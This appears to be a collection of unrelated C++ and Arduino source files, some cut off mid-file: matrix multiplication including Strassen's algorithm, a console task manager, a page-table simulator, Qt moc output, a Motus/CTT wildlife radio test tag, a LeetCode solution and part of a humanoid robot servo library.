    "\ufeff#include <iostream>\n#pragma warning(disable:4996)\nusing namespace std;\nconst int N = 100;\nint T = 0;\nvoid ob(int A[N][N], int B[N][N], int C[N][N])\n{\n\tint i, j, k;\n\tT = 0;\n\tfor (i = 0; i < N; i++)\n\t{\n\t\tfor (j = 0; j < N; j++)\n\t\t{\n\t\t\tfor (k = 0; k < N; k++)\n\t\t\t{\n\t\t\t\tC[i][j] += A[i][k] * B[k][j];\n\t\t\t\tT++;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid add_sub(int** A, int** B, int** c, int n, bool f)\n{\n\tint i, j;\n\tfor (i = 0; i < n; i++)\n\t{\n\t\tfor (j = 0; j < n; j++)\n\t\t{\n\t\t\tif (f)\n\t\t\t\tc[i][j] = A[i][j] + B[i][j];\n\t\t\telse\n\t\t\t\tc[i][j] = A[i][j] - B[i][j];\n\t\t}\n\t}\n}\n\nvoid strassen(int** A, int** B, int** C, int n)\n{\n\tint i, j, k, hn = n / 2, ** a, ** b, M[7],\n\t\t** M1, ** M2, ** M3, ** M4, ** M5, ** M6, ** M7,\n\t\t** A11, ** A12, ** A21, ** A22,\n\t\t** B11, ** B12, ** B21, ** B22,\n\t\t** C11, ** C12, ** C21, ** C22;\n\ta = new int* [n]; b = new int* [n];\n\tM1 = new int* [n]; M2 = new int* [n]; M3 = new int* [n]; M4 = new int* [n];\n\tM5 = new int* [n]; M6 = new int* [n]; M7 = new int* [n];\n\tA11 = new int* [n]; A12 = new int* [n]; A21 = new int* [n]; A22 = new int* [n];\n\tB11 = new int* [n]; B12 = new int* [n]; B21 = new int* [n]; B22 = new int* [n];\n\tC11 = new int* [n]; C12 = new int* [n]; C21 = new int* [n]; C22 = new int* [n];\n\tfor (i = 0; i < n; i++)\n\t{\n\t\ta[i] = new int[n]; b[i] = new int[n];\n\t\tM1[i] = new int[n]; M2[i] = new int[n]; M3[i] = new int[n]; M4[i] = new int[n];\n\t\tM5[i] = new int[n]; M6[i] = new int[n]; M7[i] = new int[n];\n\t\tA11[i] = new int[n]; A12[i] = new int[n]; A21[i] = new int[n]; A22[i] = new int[n];\n\t\tB11[i] = new int[n]; B12[i] = new int[n]; B21[i] = new int[n]; B22[i] = new int[n];\n\t\tC11[i] = new int[n]; C12[i] = new int[n]; C21[i] = new int[n]; C22[i] = new int[n];\n\t}\n\n\n\n\t//if (n <= 2)\n\tif (n < 2)\n\t{\n\t\t/*M[0] = (A[0][1] - A[1][1]) * (B[1][0] + B[1][1]);\n\t\tM[1] = (A[0][0] + A[1][1]) * (B[0][0] + B[1][1]);\n\t\tM[2] = (A[0][0] - A[1][0]) * (B[0][0] + B[0][1]);\n\t\tM[3] = (A[0][0] + A[0][1]) * B[1][1];\n\t\tM[4] = A[0][0] * (B[0][1] - B[1][1]);\n\t\tM[5] = A[1][1] * (B[1][0] - B[0][0]);\n\t\tM[6] = (A[1][0] + A[1][1]) * B[0][0];\n\n\t\tC[0][0] = M[0] + M[1] - M[3] + M[5];\n\t\tC[0][1] = M[3] + M[4];\n\t\tC[1][0] = M[5] + M[6];\n\t\tC[1][1] = M[1] - M[2] + M[4] - M[6];*/\n\t\tC[0][0] = A[0][0] * B[0][0];\n\t}\n\telse\n\t{\n\t\tfor (i = 0; i < hn; i++)\n\t\t{\n\t\t\tfor (j = 0; j < hn; j++)\n\t\t\t{\n\t\t\t\tA11[i][j] = A[i][j];\n\t\t\t\tA12[i][j] = A[i][j + hn];\n\t\t\t\tA21[i][j] = A[i + hn][j];\n\t\t\t\tA22[i][j] = A[i + hn][j + hn];\n\n\t\t\t\tB11[i][j] = B[i][j];\n\t\t\t\tB12[i][j] = B[i][j + hn];\n\t\t\t\tB21[i][j] = B[i + hn][j];\n\t\t\t\tB22[i][j] = B[i + hn][j + hn];\n\t\t\t}\n\t\t}\n\t\tadd_sub(A12, A22, a, hn, false);\n\t\tadd_sub(B21, B22, b, hn, true);\n\t\tstrassen(a, b, M1, hn);\n\t\tT++;\n\n\t\tadd_sub(A11, A22, a, hn, true);\n\t\tadd_sub(B11, B22, b, hn, true);\n\t\tstrassen(a, b, M2, hn);\n\t\tT++;\n\n\t\tadd_sub(A11, A21, a, hn, false);\n\t\tadd_sub(B11, B12, b, hn, true);\n\t\tstrassen(a, b, M3, hn);\n\t\tT++;\n\n\t\tadd_sub(A11, A12, a, hn, true);\n\t\tstrassen(a, B22, M4, hn);\n\t\tT++;\n\n\t\tadd_sub(B12, B22, b, hn, false);\n\t\tstrassen(A11, b, M5, hn);\n\t\tT++;\n\n\t\tadd_sub(B21, B11, b, hn, false);\n\t\tstrassen(A22, b, M6, hn);\n\t\tT++;\n\n\t\tadd_sub(A21, A22, a, hn, true);\n\t\tstrassen(a, B11, M7, hn);\n\t\tT++;\n\n\n\n\t\tadd_sub(M1, M2, a, hn, true);\n\t\tadd_sub(a, M4, b, hn, false);\n\t\tadd_sub(b, M6, C11, hn, true);\n\n\t\tadd_sub(M4, M5, C12, hn, true);\n\n\t\tadd_sub(M6, M7, C21, hn, true);\n\n\t\tadd_sub(M2, M3, a, hn, false);\n\t\tadd_sub(a, M5, b, hn, true);\n\t\tadd_sub(b, M7, C22, hn, false);\n\n\t\tfor (i = 0; i < hn; i++)\n\t\t{\n\t\t\tfor (j = 0; j < hn; j++)\n\t\t\t{\n\t\t\t\tC[i][j] = C11[i][j];\n\t\t\t\tC[i][j + hn] = C12[i][j];\n\t\t\t\tC[i + hn][j] = C21[i][j];\n\t\t\t\tC[i + hn][j + hn] = C22[i][j];\n\t\t\t}\n\t\t}\n\t}\n\n\n\n\tfor (i = 0; i < n; i++)\n\t{\n\t\tdelete[] a[i]; delete[] b[i];\n\t\tdelete[] M1[i]; delete[] M2[i]; delete[] M3[i]; delete[] M4[i];\n\t\tdelete[] M5[i]; delete[] M6[i]; delete[] M7[i];\n\t\tdelete[] A11[i]; delete[] A12[i]; delete[] A21[i]; delete[] A22[i];\n\t\tdelete[] B11[i]; delete[] B12[i]; delete[] B21[i]; delete[] B22[i];\n\t\tdelete[] C11[i]; delete[] C12[i]; delete[] C21[i]; delete[] C22[i];\n\t}\n\tdelete[] a; delete[] b;\n\tdelete[] M1; delete[] M2; delete[] M3; delete[] M4;\n\tdelete[] M5; delete[] M6; delete[] M7;\n\tdelete[] A11; delete[] A12; delete[] A21; delete[] A22;\n\tdelete[] B11; delete[] B12; delete[] B21; delete[] B22;\n\tdelete[] C11; delete[] C12; delete[] C21; delete[] C22;\n}\n\nint main()\n{\n\tFILE* f;\n\tsetlocale(LC_ALL, \"Russian\");\n\tint i, j, M, A[N][N], B[N][N], C1[N][N] = { 0 }, ** A2, ** B2, ** C2;\n\n\tfor (M = 1; M < N; M *= 2);\n\tA2 = new int* [M];\n\tB2 = new int* [M];\n\tC2 = new int* [M];\n\tfor (i = 0; i < M; i++)\n\t{\n\t\tA2[i] = new int[M];\n\t\tB2[i] = new int[M];\n\t\tC2[i] = new int[M];\n\t}\n\n\tfor (i = 0; i < M; i++)\n\t{\n\t\tfor (j = 0; j < M; j++)\n\t\t{\n\t\t\tA2[i][j] = 0;\n\t\t\tB2[i][j] = 0;\n\t\t}\n\t}\n\tfor (i = 0; i < N; i++)\n\t{\n\t\tfor (j = 0; j < N; j++)\n\t\t{\n\t\t\tA[i][j] = pow(-1, (i + j));\n\t\t\tB[i][j] = i - j;\n\t\t\tA2[i][j] = pow(-1, (i + j));\n\t\t\tB2[i][j] = i - j;\n\t\t}\n\t}\n\n\tf = fopen(\"file.txt\", \"w\");\n\t//cout << \" A:\\n\";\n\tfprintf(f, \"A:\\n\");\n\tfor (i = 0; i < N; i++)\n\t{\n\t\tfor (j = 0; j < N; j++)\n\t\t\t//cout << \" \" << A[i][j];\n\t\t\tfprintf(",
    "#include <iostream>\n#include <vector>\n#include <string>\n\nusing namespace std;\n\nstruct Task {\n    string description;\n    bool completed;\n};\n\nvoid displayMenu() {\n    cout << \"Task Manager\\n\";\n    cout << \"============\\n\";\n    cout << \"1. Add Task\\n\";\n    cout << \"2. View Tasks\\n\";\n    cout << \"3. Mark Task as Completed\\n\";\n    cout << \"4. Remove Task\\n\";\n    cout << \"5. Exit\\n\";\n    cout << \"Choose an option (1-5): \";\n}\n\nvoid addTask(vector<Task>& tasks) {\n    Task newTask;\n    cout << \"Enter task description: \";\n    cin.ignore();\n    getline(cin, newTask.description);\n    newTask.completed = false;\n    tasks.push_back(newTask);\n    cout << \"Task added successfully!\\n\";\n}\n\nvoid viewTasks(const vector<Task>& tasks) {\n    if (tasks.empty()) {\n        cout << \"No tasks available.\\n\";\n        return;\n    }\n\n    cout << \"Task List:\\n\";\n    for (size_t i = 0; i < tasks.size(); ++i) {\n        cout << i + 1 << \". \" << tasks[i].description\n             << \" [\" << (tasks[i].completed ? \"Completed\" : \"Pending\") << \"]\\n\";\n    }\n}\n\nvoid markTaskAsCompleted(vector<Task>& tasks) {\n    int taskIndex;\n    cout << \"Enter task number to mark as completed: \";\n    cin >> taskIndex;\n\n    if (taskIndex < 1 || taskIndex > tasks.size()) {\n        cout << \"Invalid task number.\\n\";\n        return;\n    }\n\n    tasks[taskIndex - 1].completed = true;\n    cout << \"Task marked as completed!\\n\";\n}\n\nvoid removeTask(vector<Task>& tasks) {\n    int taskIndex;\n    cout << \"Enter task number to remove: \";\n    cin >> taskIndex;\n\n    if (taskIndex < 1 || taskIndex > tasks.size()) {\n        cout << \"Invalid task number.\\n\";\n        return;\n    }\n\n    tasks.erase(tasks.begin() + taskIndex - 1);\n    cout << \"Task removed successfully!\\n\";\n}\n\nint main() {\n    vector<Task> tasks;\n    int choice;\n\n    do {\n        displayMenu();\n        cin >> choice;\n\n        switch (choice) {\n            case 1:\n                addTask(tasks);\n                break;\n            case 2:\n                viewTasks(tasks);\n                break;\n            case 3:\n                markTaskAsCompleted(tasks);\n                break;\n            case 4:\n                removeTask(tasks);\n                break;\n            case 5:\n                cout << \"Exiting the task manager. Goodbye!\\n\";\n                break;\n            default:\n                cout << \"Invalid choice. Please try again.\\n\";\n        }\n    } while (choice != 5);\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <cstdio>\n#include <unistd.h>\n#include <string>\n#include \"pagetable.h\"\n#include \"circular_list.h\"\n#include \"log_helpers.h\"\n#include \"vaddr_tracereader.h\"\n\nusing namespace std;\n\n\n\n//TODO: byte counts\n\n\n\n\n//main function for program execution.... to .... . . . . .\nint main(int argc, char* argv[]){\n\n\t//***********************************\n\t//PROGRAM DATA: variables to store argument info..\n    int lvlCount = 0;\n\t//test pg table\n\tPageTable* pageTable = new PageTable();//= new PageTable();\n\t//***********************************\n\n\n\n\n\n\n\n//TODO: handle optional inputs\t**********************\n\t//integer for optional args.\n\tint option = 0;\n\n\tint val = 0;//handle optional integer arguments\n\n    while((option = getopt(argc,argv,\"n:f:a:l:\")) != -1){\n\t\tswitch(option){\n\t\t\t//number of accesses to process\n            case 'n':\n\t\t\t\tval = atoi(optarg);\n\t\t\t\t\tif(val < 1){\n                        printf(\"Number of memory accesses must be a number, greater than 0\\n\");\n                        exit(NORMAL_EXIT);\n                    }\n\t\t\t\t\t pageTable->numOfAccesses = val;//set number of accesses\n\n\t\t\t\tbreak;\n\n            //physical frame limit for the page table\n\t\t\tcase 'f':\n\t\t\t\tval = atoi(optarg);\n                if(val < 1){\n                    printf(\"Number of available frames must be a number, greater than 0\\n\");\n                    exit(NORMAL_EXIT);\n                }\n                pageTable->frameLimit = val;//set frameLimit to user input\n\t\t\t\tbreak;\n\n            //age of last access\n\t\t\tcase 'a':\n\t\t\t\tval = atoi(optarg);\n                if(val < 1){\n                    printf(\"Age of last access considered recent must be a number, greater than 0\\n\");\n                    exit(NORMAL_EXIT);\n                }\n                pageTable->ageLimit = val;\n\t\t\t\tbreak;\n\n\t\t\t//program logging mode\n\t\t\tcase 'l':       \n\t\t\t\tpageTable->logLvl=optarg;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tprintf(\"invalid argument\\n\");\n\t\t\t\texit(NORMAL_EXIT);\n\t\t}\n\t}\n\n\n\n\t//INDEX path to mandatory arguments after the opt. args\n\tint optidx = optind;\n\n\t//verify that min. num. of args was given. (two filenames,and bit amnt for level 0.)\t\n\tif(optidx+2>argc){\n\t\texit(NORMAL_EXIT);\n\t}\n\n\n\t/*\n\t\tidx, and idx+1 are file names. any other args are input bit counts for each level.\n\t\tlevel0 bit must be atleast 1. all other bit level must also be atleast 1. total bits must be <=28\n\t\toffset = 32-totalBitsInput;\toffset minimum is 4 bits\n\t*/\n\n//get filenames from arguments\n\tint tr_idx =optidx;\n\toptidx++;\n\n\tint rw_idx =optidx;\n\toptidx++;\n\n\n\t//set level count to the amount of different bit-specific levels in remaining args.\n    lvlCount = argc-optidx;\n\n\n    //construct page table dynamically using the lvlCount.\n\tpageTable->pageTableSetup(lvlCount);\n\n\n    //TODO TEST TEST TEST\n  //cout << \"LEVEL COUNT: \" << pageTable->lvlCount << \" OR \" << lvlCount << endl;\n\n\n    //set the file names\n\tpageTable->file[TR_FILE_IDX] = argv[tr_idx];\n\tpageTable->file[RW_FILE_IDX] = argv[rw_idx];\n\n\n    //fetch the user specified bits.\n\tfor(int i = 0;optidx<argc;i++){\n\n        //check for valid input bits\n\t\tif(atoi(argv[optidx]) <= 0){\n\t\t\tprintf(\"Level %d page table must be at least 1 bit\\n\",i);\n\t\t\texit(NORMAL_EXIT);\t\n\t\t}\n\n        //load pageTable with the input data\n\t\tpageTable->inputBits[i] = atoi(argv[optidx]);\n\n\n        //TODO TEST TEST TEST\n        //cout << \"INPUT BITS: \" << pageTable->inputBits[i] << endl;\n\n\n        pageTable->totalBitsInput+=atoi(argv[optidx]);\n\n\t    //increment to next arg\n        optidx++;\n\t}\n\n//TODO TEST\n//cout <<\"total bits: \" << pageTable->totalBitsInput << endl;\n\n\n\t//validate the total user input bits\n\tif(pageTable->totalBitsInput>MAX_BITS){\n\t\tprintf(\"Too many bits used in page tables\\n\");\n\t\texit(NORMAL_EXIT);\n\t}\n\n\n\n    //set up pageTable parameters\n    pageTable->setEntryCount();\n    pageTable->createShiftAry();\n    pageTable->createBitmaskAry();\n    pageTable->setRoot();//initializes pageTable root level.\n\n    //calculate offset DECLARE THIS IN PAGE TABLE...32bit system MINUS bits specified for each level\n    //offset = CPU_BITS-totalBitsInput;\n\n\n\n\n\n    //FILE I/O HANDLING\n\tFILE* tr_file = fopen(pageTable->file[TR_FILE_IDX],\"r\");//open trace file for reading\n\tif(tr_file == nullptr){\n\t\tprintf(\"Unable to open <<trace.tr>>\\n\");\n\t\texit(NORMAL_EXIT);\n\t}\n\tFILE* rw_file = fopen(pageTable->file[RW_FILE_IDX],\"r\");//open readw rites file for reading\n\tif(rw_file == nullptr){\n\t\tprintf(\"Unable to open <<readswrites.txt>>\\n\");\n\t\texit(NORMAL_EXIT);\n\t}\n\n\n\n\n\n\n\t//create address struct found in the vaddr_tracereader.h file\n\tp2AddrTr* virtualAddressTrace = new p2AddrTr;\n\tvirtualAddressTrace->addr=0;\n\tvirtualAddressTrace->time=0;\n    unsigned int virtualAddress = 0;\n\n    //0 or 1 for file memory access\n    int access = 0;\n    bool rw = false;\n\n\n\n    //iterate through each virtual address in the trace file. Function returns 0 when it cannot complete\n\twhile(NextAddress(tr_file,virtualAddressTrace)!=0){\n            //get the rw access..negates edge case since there s",
    "/****************************************************************************\n** Meta object code from reading C++ file 'mainwindow.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.6.3)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../mainwindow.h\"\n#include <QtNetwork/QSslError>\n#include <QtGui/qtextcursor.h>\n#include <QtGui/qscreen.h>\n#include <QtCharts/qlineseries.h>\n#include <QtCharts/qabstractbarseries.h>\n#include <QtCharts/qvbarmodelmapper.h>\n#include <QtCharts/qboxplotseries.h>\n#include <QtCharts/qcandlestickseries.h>\n#include <QtCore/qabstractitemmodel.h>\n#include <QtCharts/qpieseries.h>\n#include <QtCore/qabstractitemmodel.h>\n#include <QtCharts/qboxplotseries.h>\n#include <QtCore/qabstractitemmodel.h>\n#include <QtCharts/qpieseries.h>\n#include <QtCharts/qpieseries.h>\n#include <QtCore/qabstractitemmodel.h>\n#include <QtCharts/qxyseries.h>\n#include <QtCharts/qxyseries.h>\n#include <QtCore/qabstractitemmodel.h>\n#include <QtCore/qabstractitemmodel.h>\n#include <QtCharts/qboxplotseries.h>\n#include <QtCore/qabstractitemmodel.h>\n#include <QtCharts/qpieseries.h>\n#include <QtCore/qabstractitemmodel.h>\n#include <QtCharts/qxyseries.h>\n#include <QtCore/qabstractitemmodel.h>\n#include <QtCore/qmetatype.h>\n\n#if __has_include(<QtCore/qtmochelpers.h>)\n#include <QtCore/qtmochelpers.h>\n#else\nQT_BEGIN_MOC_NAMESPACE\n#endif\n\n\n#include <memory>\n\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'mainwindow.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.6.3. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSMainWindowENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSMainWindowENDCLASS = QtMocHelpers::stringData(\n    \"MainWindow\",\n    \"on_sign_up_clicked\",\n    \"\",\n    \"on_sign_in_clicked\",\n    \"onTimerTimeout\"\n);\n#else  // !QT_MOC_HAS_STRING_DATA\nstruct qt_meta_stringdata_CLASSMainWindowENDCLASS_t {\n    uint offsetsAndSizes[10];\n    char stringdata0[11];\n    char stringdata1[19];\n    char stringdata2[1];\n    char stringdata3[19];\n    char stringdata4[15];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(sizeof(qt_meta_stringdata_CLASSMainWindowENDCLASS_t::offsetsAndSizes) + ofs), len \nQ_CONSTINIT static const qt_meta_stringdata_CLASSMainWindowENDCLASS_t qt_meta_stringdata_CLASSMainWindowENDCLASS = {\n    {\n        QT_MOC_LITERAL(0, 10),  // \"MainWindow\"\n        QT_MOC_LITERAL(11, 18),  // \"on_sign_up_clicked\"\n        QT_MOC_LITERAL(30, 0),  // \"\"\n        QT_MOC_LITERAL(31, 18),  // \"on_sign_in_clicked\"\n        QT_MOC_LITERAL(50, 14)   // \"onTimerTimeout\"\n    },\n    \"MainWindow\",\n    \"on_sign_up_clicked\",\n    \"\",\n    \"on_sign_in_clicked\",\n    \"onTimerTimeout\"\n};\n#undef QT_MOC_LITERAL\n#endif // !QT_MOC_HAS_STRING_DATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSMainWindowENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       3,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    0,   32,    2, 0x08,    1 /* Private */,\n       3,    0,   33,    2, 0x08,    2 /* Private */,\n       4,    0,   34,    2, 0x08,    3 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject MainWindow::staticMetaObject = { {\n    QMetaObject::SuperData::link<QMainWindow::staticMetaObject>(),\n    qt_meta_stringdata_CLASSMainWindowENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSMainWindowENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSMainWindowENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<MainWindow, std::true_type>,\n        // method 'on_sign_up_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_sign_in_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'onTimerTimeout'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>\n    >,\n    nullptr\n} };\n\nvoid MainWindow::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<MainWindow *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->on_sign_up_clicked(); break;\n        case 1: _t->on_sign_in_clicked(); break;\n        case 2: _t->onTimerTimeout()",
    "// Simple Motus/CTT test tag\r\n\r\n#include <Arduino.h>\r\n#include <RadioLib.h> // https://github.com/jgromes/RadioLib\r\n#include <CRC.h> // https://github.com/RobTillaart/CRC\r\n\r\n#define TAG_ID 0x78554c33 // TvE's test tag: use freely ;-)\r\n//#define TAG_ID 0x613455FF // Another test tag\r\n#define POW 5 // dBm output power, range -xx..17dBm\r\n#define INTERVAL 2000 // TX interval in milliseconds\r\n\r\n#if defined(__AVR_ATmega32U4__)\r\n  #define RFM69_CS    8\r\n  #define RFM69_INT   7\r\n  #define RFM69_RST   4\r\n  #define LED_BUILTIN 13\r\n  RF69 radio = new Module(RFM69_CS, RFM69_INT, RFM69_RST);\r\n#elif defined(ARDUINO_SAMD_FEATHER_M0)\r\n  #define RFM69_CS    8\r\n  #define RFM69_INT   3\r\n  #define RFM69_RST   4\r\n  #define LED_BUILTIN 13\r\n  RF69 radio = new Module(RFM69_CS, RFM69_INT, RFM69_RST);\r\n#endif\r\n\r\n// Encode 20-bit value into 32 bits\r\nuint8_t code[] = {\r\n  0x00, 0x07, 0x19, 0x1E, 0x2A, 0x2D, 0x33, 0x34, 0x4B, 0x4C, 0x52, 0x55,\r\n  0x61, 0x66, 0x78, 0x7F, 0x80, 0x87, 0x99, 0x9E, 0xAA, 0xAD, 0xB3, 0xB4,\r\n  0xCB, 0xCC, 0xD2, 0xD5, 0xE1, 0xE6, 0xF8, 0xFF };\r\n\r\nuint32_t encode(uint32_t val20) {\r\n  uint32_t val32 = 0;\r\n  for (int i=0; i<4; i++) {\r\n    val32 <<= 8;\r\n    val32 |= code[val20 & 0x1F];\r\n    val20 >>= 5;\r\n  }\r\n  return val32;\r\n}\r\n\r\nbool transmittedFlag = false;  // flag that a packet was transmitted\r\nuint8_t packet[5];             // buffer for the packet\r\nuint8_t sync[] = {0xD3, 0x91}; // sync word\r\n\r\n// ******************************************************************************************* setup\r\nvoid setup() {\r\n  // Pin initialization\r\n  pinMode(LED_BUILTIN, OUTPUT);\r\n  digitalWrite(LED_BUILTIN, HIGH);\r\n\r\n  Serial.begin(115200);\r\n\r\n  // prep packet\r\n#ifdef TAG_ID\r\n  packet[0] = (TAG_ID>>24) & 0xff;\r\n  packet[1] = (TAG_ID>>16) & 0xff;\r\n  packet[2] = (TAG_ID>>8) & 0xff;\r\n  packet[3] = TAG_ID & 0xFF;\r\n#else\r\n  const id = 0x12345; // 20 bits\r\n  uint32_t pkt = encode(uid);\r\n  packet[0] = (pkt >> 24) & 0xFF;\r\n  packet[1] = (pkt >> 16) & 0xFF;\r\n  packet[2] = (pkt >> 8) & 0xFF;\r\n  packet[3] = pkt & 0xFF;\r\n#endif\r\n  packet[4] = calcCRC8(packet, 4);\r\n\r\n  while(!Serial);\r\n  delay(10);\r\n  Serial.print(\"\\n\\nCTT test tag \");\r\n  Serial.print(packet[0], 16); Serial.print(\" \");\r\n  Serial.print(packet[1], 16); Serial.print(\" \");\r\n  Serial.print(packet[2], 16); Serial.print(\" \");\r\n  Serial.print(packet[3], 16); Serial.print(\" (\");\r\n  Serial.print(packet[4], 16);\r\n  Serial.println(\")\");\r\n\r\n  SPI.begin();\r\n  radio.reset();\r\n  #define FREQ 434\r\n  #define BR 25\r\n  #define FREQDEV 25\r\n  #define RXBW 50\r\n  #define PRELEN 24 // longer than real tags use, but can only help...\r\n  int state = radio.begin(FREQ, BR, FREQDEV, RXBW, POW, PRELEN);\r\n  radio.fixedPacketLengthMode(5);\r\n  radio.setSyncWord(sync, sizeof(sync));\r\n  radio.setDataShaping(RADIOLIB_SHAPING_NONE);\r\n\r\n  if (state == RADIOLIB_ERR_NONE) {\r\n    Serial.println(\"radio initialized\");\r\n  } else {\r\n    Serial.print(\"radio init failed, code \");\r\n    Serial.println(state);\r\n    while (true) {\r\n      digitalWrite(LED_BUILTIN, LOW);\r\n      delay(50);\r\n      digitalWrite(LED_BUILTIN, HIGH);\r\n      delay(50);\r\n    }\r\n  }\r\n}\r\n\r\nvoid rapidBlink() {\r\n  for (int i=0; i<10; i++) {\r\n    digitalWrite(LED_BUILTIN, LOW);\r\n    delay(50);\r\n    digitalWrite(LED_BUILTIN, HIGH);\r\n    delay(50);\r\n  }\r\n}\r\n\r\n// ***********************************************************************************************************\r\nvoid loop() {\r\n  transmittedFlag = false;\r\n  int16_t state = radio.transmit(packet, sizeof(packet));\r\n  if (state == RADIOLIB_ERR_NONE) {\r\n    // packet was successfully sent\r\n    Serial.println(\"TX done\");\r\n    digitalWrite(LED_BUILTIN, HIGH);\r\n    delay(100);\r\n    digitalWrite(LED_BUILTIN, LOW);\r\n  } else {\r\n    // some other error occurred\r\n    Serial.print(\"TX failed, code \");\r\n    Serial.println(state);\r\n    rapidBlink();\r\n  }\r\n  delay(INTERVAL-100);\r\n}\r\n",
    "/*\nProblem Statement - 3207 : Maximum Points after Enemy Battles\nYou are given an integer array enemyEnergies denoting the energy values of various enemies.\n\nYou are also given an integer currentEnergy denoting the amount of energy you have initially.\n\nYou start with 0 points, and all the enemies are unmarked initially.\n\nYou can perform either of the following operations zero or multiple times to gain points:\n\nChoose an unmarked enemy, i, such that currentEnergy >= enemyEnergies[i]. By choosing this option:\nYou gain 1 point.\nYour energy is reduced by the enemy's energy, i.e. currentEnergy = currentEnergy - enemyEnergies[i].\nIf you have at least 1 point, you can choose an unmarked enemy, i. By choosing this option:\nYour energy increases by the enemy's energy, i.e. currentEnergy = currentEnergy + enemyEnergies[i].\nThe enemy i is marked.\nReturn an integer denoting the maximum points you can get in the end by optimally performing operations.\n\n \n\nExample 1:\n\nInput: enemyEnergies = [3,2,2], currentEnergy = 2\n\nOutput: 3\n\nExplanation:\n\nThe following operations can be performed to get 3 points, which is the maximum:\n\nFirst operation on enemy 1: points increases by 1, and currentEnergy decreases by 2. So, points = 1, and currentEnergy = 0.\nSecond operation on enemy 0: currentEnergy increases by 3, and enemy 0 is marked. So, points = 1, currentEnergy = 3, and marked enemies = [0].\nFirst operation on enemy 2: points increases by 1, and currentEnergy decreases by 2. So, points = 2, currentEnergy = 1, and marked enemies = [0].\nSecond operation on enemy 2: currentEnergy increases by 2, and enemy 2 is marked. So, points = 2, currentEnergy = 3, and marked enemies = [0, 2].\nFirst operation on enemy 1: points increases by 1, and currentEnergy decreases by 2. So, points = 3, currentEnergy = 1, and marked enemies = [0, 2].\nExample 2:\n\nInput: enemyEnergies = [2], currentEnergy = 10\n\nOutput: 5\n\nExplanation:\n\nPerforming the first operation 5 times on enemy 0 results in the maximum number of points.\n\nConstraints:\n\n1 <= enemyEnergies.length <= 105\n1 <= enemyEnergies[i] <= 109\n0 <= currentEnergy <= 109\n*/\n\nclass Solution {\npublic:\n    long long maximumPoints(vector<int>& enemyEnergies, int currentEnergy) {\n        int n = enemyEnergies.size(); \n        long long points = 0; \n        sort(enemyEnergies.begin(), enemyEnergies.end()); \n        \n        int st = 0, en = n-1; \n        while (st <= en) { \n            if (enemyEnergies[st] > currentEnergy) { \n                if (points == 0) { \n                    // 0 point left && enemy's energy is greater than player energy\n                    // no option left except quit\n                    return 0; \n                } \n\n                // add enemy's energy to current energy until current energy greater than current position enemy\n                while (currentEnergy < enemyEnergies[st]) { \n                    currentEnergy += enemyEnergies[en]; \n                    en--; \n                } \n            } else { \n                // take the energy from current and subtract from the enemy energy\n                // also add the points each time you add attack the enemy\n                points = points + (currentEnergy / enemyEnergies[st]); \n                currentEnergy = currentEnergy % enemyEnergies[st]; \n            } \n        } \n\n        \n        return points; \n    }\n};",
    "#include \"MiniHashHumanoid.h\"\r\n\r\n#include <Wire.h>\r\n#include <Adafruit_PWMServoDriver.h>\r\nAdafruit_PWMServoDriver pwm = Adafruit_PWMServoDriver(0x40);\r\n#include <Adafruit_GFX.h>\r\n#include <Adafruit_SSD1306.h>\r\n#include \"XT_DAC_Audio.h\"\r\n\r\n#define SCREEN_WIDTH 128\r\n#define SCREEN_HEIGHT 64\r\nAdafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);\r\nXT_DAC_Audio_Class DacAudio(25, 0);\r\n\r\n#include \"ExpressionBitmap.h\"\r\n#include \"VoiceHexData.h\"\r\n\r\n#define min_pulse_width 100\r\n#define max_pulse_width 550\r\n#define frequency 50\r\n\r\n/* Initializing servo drive and OLED display */\r\nvoid MiniHashHumanoid::init_hash() {\r\n  pwm.begin();\r\n  pwm.setPWMFreq(frequency);\r\n\r\n  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {\r\n    Serial.println(F(\"SSD1306 allocation failed\"));\r\n    for (;;);\r\n  }\r\n  initial_face();\r\n}\r\n\r\n/* Servo angle setting */\r\nvoid MiniHashHumanoid::set_servo(int servo, int servo_pwm) {\r\n  pwm.setPWM(servo, 0, servo_pwm);\r\n}\r\n\r\n/* Initial position */\r\nvoid MiniHashHumanoid::initial_position() {\r\n  int pwm_array[16] = {100, 100, 325, 